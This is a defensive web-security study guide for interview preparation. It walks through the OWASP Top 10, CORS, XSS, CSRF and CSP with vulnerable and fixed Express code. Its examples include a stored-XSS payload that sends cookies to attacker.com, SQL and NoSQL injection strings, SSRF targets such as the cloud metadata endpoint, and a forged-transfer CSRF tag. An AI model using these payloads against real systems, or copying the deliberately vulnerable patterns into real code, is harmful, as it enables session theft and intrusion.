# Web Security Guide - EPAM Interview Topics

## 🎯 Security Fundamentals for Senior Level

---

## 1. OWASP Top 10 (2021)

### A01: Broken Access Control

**What:** Users can access resources they shouldn't.

**Examples:**
- Accessing other user's data by changing URL parameter
- Bypassing authentication
- Privilege escalation

**Prevention:**

```javascript
// ❌ BAD: Direct object reference
app.get('/user/:id', async (req, res) => {
  const user = await db.users.findById(req.params.id);
  res.json(user); // Any user can access any user's data!
});

// ✅ GOOD: Check authorization
app.get('/user/:id', authenticateToken, async (req, res) => {
  const userId = req.params.id;
  
  // Check if user owns this resource or is admin
  if (req.user.id !== userId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const user = await db.users.findById(userId);
  res.json(user);
});
```

---

### A02: Cryptographic Failures

**What:** Exposing sensitive data due to weak/missing encryption.

**Examples:**
- Storing passwords in plaintext
- Weak encryption algorithms
- Not using HTTPS

**Prevention:**

```javascript
const bcrypt = require('bcrypt');
const crypto = require('crypto');

// ✅ Hash passwords
async function hashPassword(password) {
  const saltRounds = 10;
  return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

// ✅ Encrypt sensitive data
function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(encryptedText, key) {
  const parts = encryptedText.split(':');
  const iv = Buffer.from(parts[0], 'hex');
  const encrypted = parts[1];
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

// ✅ Use HTTPS
// In production, use proper SSL certificates
```

---

### A03: Injection (SQL, NoSQL, Command)

**What:** Untrusted data sent to interpreter as command.

**SQL Injection:**

```javascript
// ❌ BAD: SQL Injection vulnerable
app.get('/users', (req, res) => {
  const name = req.query.name;
  const query = `SELECT * FROM users WHERE name = '${name}'`;
  // Attacker can send: ' OR '1'='1' --
  // Result: SELECT * FROM users WHERE name = '' OR '1'='1' --'
  db.query(query, (err, results) => res.json(results));
});

// ✅ GOOD: Parameterized queries
app.get('/users', (req, res) => {
  const name = req.query.name;
  const query = 'SELECT * FROM users WHERE name = ?';
  db.query(query, [name], (err, results) => res.json(results));
});

// ✅ GOOD: ORM (Prisma, Sequelize)
app.get('/users', async (req, res) => {
  const users = await prisma.user.findMany({
    where: { name: req.query.name }
  });
  res.json(users);
});
```

**NoSQL Injection:**

```javascript
// ❌ BAD: NoSQL Injection vulnerable
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  // Attacker can send: { email: { $gt: "" }, password: { $gt: "" } }
  const user = await db.users.findOne({ email, password });
  if (user) {
    // Logged in without valid credentials!
  }
});

// ✅ GOOD: Validate and sanitize
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate types
  if (typeof email !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  const user = await db.users.findOne({ email });
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    // Valid login
  }
});
```

---

### A04: Insecure Design

**What:** Missing or ineffective security controls by design.

**Example: Rate limiting:**

```javascript
const rateLimit = require('express-rate-limit');

// ✅ Implement rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/login', loginLimiter, async (req, res) => {
  // Login logic
});
```

---

### A05: Security Misconfiguration

**What:** Insecure default configurations, incomplete setups.

**Prevention:**

```javascript
const helmet = require('helmet');
const express = require('express');

const app = express();

// ✅ Use helmet for security headers
app.use(helmet());

// ✅ Disable X-Powered-By header
app.disable('x-powered-by');

// ✅ Set secure cookies
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: true,     // Only HTTPS
    httpOnly: true,   // No JavaScript access
    sameSite: 'strict',
    maxAge: 3600000   // 1 hour
  }
}));

// ✅ Hide error details in production
if (process.env.NODE_ENV === 'production') {
  app.use((err, req, res, next) => {
    res.status(500).json({ error: 'Internal server error' });
    // Log full error server-side only
    console.error(err);
  });
}
```

---

### A06: Vulnerable and Outdated Components

**What:** Using libraries with known vulnerabilities.

**Prevention:**

```bash
# ✅ Check for vulnerabilities
npm audit

# Fix vulnerabilities
npm audit fix

# Force fix (may break things)
npm audit fix --force

# Use Snyk or similar tools
npx snyk test
npx snyk monitor
```

---

### A07: Identification and Authentication Failures

**What:** Weak authentication mechanisms.

**Prevention:**

```javascript
const jwt = require('jsonwebtoken');

// ✅ Strong password policy
function validatePassword(password) {
  const minLength = 8;
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumbers = /\d/.test(password);
  const hasSpecialChar = /[!@#$%^&*]/.test(password);
  
  return password.length >= minLength &&
         hasUpperCase && hasLowerCase &&
         hasNumbers && hasSpecialChar;
}

// ✅ Multi-factor authentication
const speakeasy = require('speakeasy');

function generateTOTP(secret) {
  return speakeasy.totp({
    secret: secret,
    encoding: 'base32'
  });
}

function verifyTOTP(secret, token) {
  return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: token,
    window: 2  // Allow 2-step time window
  });
}

// ✅ Secure session management
app.post('/login', async (req, res) => {
  const { email, password, totpToken } = req.body;
  
  const user = await db.users.findOne({ email });
  
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Verify TOTP
  if (!verifyTOTP(user.totpSecret, totpToken)) {
    return res.status(401).json({ error: 'Invalid 2FA code' });
  }
  
  // Generate JWT
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  res.json({ token });
});
```

---

### A08: Software and Data Integrity Failures

**What:** Code/infrastructure without integrity verification.

**Prevention:**

```javascript
// ✅ Use subresource integrity (SRI) for CDN resources
// <script src="https://cdn.example.com/lib.js"
//         integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
//         crossorigin="anonymous"></script>

// ✅ Verify package integrity
// package-lock.json includes integrity hashes

// ✅ Sign releases
// Use GPG signing for production releases
```

---

### A09: Security Logging and Monitoring Failures

**What:** Insufficient logging and monitoring.

**Prevention:**

```javascript
const winston = require('winston');

// ✅ Implement comprehensive logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// ✅ Log security events
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.users.findOne({ email });
  
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    // Log failed login attempt
    logger.warn('Failed login attempt', {
      email,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      timestamp: new Date()
    });
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Log successful login
  logger.info('Successful login', {
    userId: user.id,
    email,
    ip: req.ip,
    timestamp: new Date()
  });
  
  // ...
});

// ✅ Monitor for suspicious patterns
// - Multiple failed logins from same IP
// - Access to sensitive endpoints
// - Unusual data access patterns
```

---

### A10: Server-Side Request Forgery (SSRF)

**What:** Attacker tricks server into making requests to unintended locations.

**Prevention:**

```javascript
const axios = require('axios');
const { URL } = require('url');

// ❌ BAD: SSRF vulnerable
app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  // Attacker can send: http://localhost:6379 (access Redis)
  //                 or: http://169.254.169.254/latest/meta-data/ (AWS metadata)
  const response = await axios.get(url);
  res.json(response.data);
});

// ✅ GOOD: Validate and whitelist
const ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];

app.get('/fetch', async (req, res) => {
  const urlString = req.query.url;
  
  try {
    const url = new URL(urlString);
    
    // Check protocol
    if (!['http:', 'https:'].includes(url.protocol)) {
      return res.status(400).json({ error: 'Invalid protocol' });
    }
    
    // Check domain whitelist
    if (!ALLOWED_DOMAINS.includes(url.hostname)) {
      return res.status(400).json({ error: 'Domain not allowed' });
    }
    
    // Block private IPs
    const ip = url.hostname;
    if (
      ip.startsWith('192.168.') ||
      ip.startsWith('10.') ||
      ip.startsWith('172.16.') ||
      ip === 'localhost' ||
      ip === '127.0.0.1' ||
      ip === '169.254.169.254'  // AWS metadata
    ) {
      return res.status(400).json({ error: 'Private IP not allowed' });
    }
    
    const response = await axios.get(urlString, { timeout: 5000 });
    res.json(response.data);
  } catch (error) {
    res.status(400).json({ error: 'Invalid URL' });
  }
});
```

---

## 2. CORS (Cross-Origin Resource Sharing)

### What is CORS?

**Browser security feature that restricts cross-origin HTTP requests.**

### Same-Origin Policy

```javascript
// Same origin: https://example.com/page1 → https://example.com/page2 ✅
// Different origin: https://example.com → https://api.example.com ❌
// Different protocol: https://example.com → http://example.com ❌
// Different port: https://example.com → https://example.com:3000 ❌
```

### Implementing CORS

```javascript
const cors = require('cors');

// ✅ Allow specific origin
app.use(cors({
  origin: 'https://example.com',
  credentials: true,  // Allow cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// ✅ Dynamic origin validation
app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = [
      'https://example.com',
      'https://app.example.com'
    ];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
}));

// ❌ NEVER do this in production
app.use(cors({ origin: '*' }));  // Allows any origin!
```

---

## 3. XSS (Cross-Site Scripting)

### What is XSS?

**Attacker injects malicious scripts into web pages.**

### Types:

**1. Stored XSS:**

```javascript
// ❌ BAD: Storing and rendering unsanitized HTML
app.post('/comment', async (req, res) => {
  const { text } = req.body;
  // User sends: <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
  await db.comments.create({ text });
});

// Rendering in template:
// <div>{comment.text}</div>  // Script executes!

// ✅ GOOD: Sanitize input
const DOMPurify = require('isomorphic-dompurify');

app.post('/comment', async (req, res) => {
  const { text } = req.body;
  const sanitized = DOMPurify.sanitize(text);
  await db.comments.create({ text: sanitized });
});
```

**2. Reflected XSS:**

```javascript
// ❌ BAD: Reflecting user input without escaping
app.get('/search', (req, res) => {
  const query = req.query.q;
  // User visits: /search?q=<script>alert('XSS')</script>
  res.send(`Search results for: ${query}`);  // Script executes!
});

// ✅ GOOD: Escape HTML
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`Search results for: ${query}`);
});
```

**3. DOM-based XSS:**

```javascript
// ❌ BAD: Client-side
const urlParams = new URLSearchParams(window.location.search);
const name = urlParams.get('name');
document.getElementById('greeting').innerHTML = `Hello ${name}`;
// User visits: ?name=<img src=x onerror=alert('XSS')>

// ✅ GOOD: Use textContent or sanitize
document.getElementById('greeting').textContent = `Hello ${name}`;
```

### Prevention:

```javascript
// ✅ Content Security Policy
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],  // Avoid 'unsafe-inline' if possible
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"]
  }
}));

// ✅ X-XSS-Protection header (deprecated but still useful)
app.use(helmet.xssFilter());

// ✅ Use templating engines that auto-escape
// React, Vue, Angular auto-escape by default
// Handlebars: use {{}} instead of {{{ }}}
```

---

## 4. CSRF (Cross-Site Request Forgery)

### What is CSRF?

**Attacker tricks user into making unwanted requests.**

**Example attack:**

```html
<!-- Attacker's website -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- If user is logged into bank.com, request executes! -->
```

### Prevention:

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

// ✅ CSRF protection
app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Generate CSRF token
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Verify CSRF token
app.post('/transfer', (req, res) => {
  // Token automatically verified by middleware
  // If invalid, 403 Forbidden is returned
  res.json({ success: true });
});

// In HTML form:
// <input type="hidden" name="_csrf" value="{{csrfToken}}" />

// ✅ SameSite cookies
app.use(session({
  cookie: {
    sameSite: 'strict',  // or 'lax'
    secure: true,
    httpOnly: true
  }
}));

// ✅ Double Submit Cookie pattern
app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];
  
  if (cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  // Process request
});
```

---

## 5. CSP (Content Security Policy)

### What is CSP?

**HTTP header that controls resources the browser is allowed to load.**

```javascript
// ✅ Strict CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],                          // Default: only same origin
    scriptSrc: ["'self'", "https://cdn.example.com"], // Scripts from self and CDN
    styleSrc: ["'self'", "'unsafe-inline'"],         // Styles (inline allowed)
    imgSrc: ["'self'", "data:", "https:"],           // Images from anywhere HTTPS
    connectSrc: ["'self'", "https://api.example.com"], // AJAX requests
    fontSrc: ["'self'"],                             // Fonts
    objectSrc: ["'none'"],                           // No plugins (Flash, etc.)
    mediaSrc: ["'self'"],                            // Audio/video
    frameSrc: ["'none'"],                            // No iframes
    reportUri: "/csp-violation-report"               // Report violations
  }
}));

// ✅ CSP violation reporting
app.post('/csp-violation-report', (req, res) => {
  console.warn('CSP Violation:', req.body);
  res.status(204).end();
});
```

---

## 🎯 Interview Quick Tips

**Be ready to explain:**
- Difference between XSS and CSRF
- How CORS works and why it exists
- OWASP Top 10 (at least top 5)
- How to prevent SQL injection
- What is CSP and why use it
- How JWT authentication works
- Rate limiting strategies
- Difference between authentication and authorization

**Security headers you should know:**
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- X-XSS-Protection: 1; mode=block
- Strict-Transport-Security (HSTS)
- Content-Security-Policy

Good luck! 🚀
